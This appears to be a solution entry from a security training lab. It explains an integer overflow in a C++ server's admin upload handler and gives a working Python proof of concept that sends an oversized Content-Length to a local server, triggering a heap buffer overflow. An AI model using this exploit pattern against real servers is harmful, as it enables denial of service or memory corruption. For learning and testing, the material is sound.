# Solution — 10 · Integer Overflow

**Code**: `handlers/admin.cpp` → `unsigned int buffer_size = content_len + 64;`

```python
import socket
s = socket.socket()
s.connect(('127.0.0.1', 8081))

payload = (
    b"POST /admin/upload_file HTTP/1.1\r\n"
    b"Host: 127.0.0.1\r\n"
    b"Authorization: Basic YWRtaW46YWRtaW4=\r\n"
    b"Content-Length: 4294967232\r\n\r\n"  # UINT_MAX - 63
    + b"A" * 1000
)
s.send(payload)
s.close()
```

Under ASan the server aborts with a heap-buffer-overflow trace.
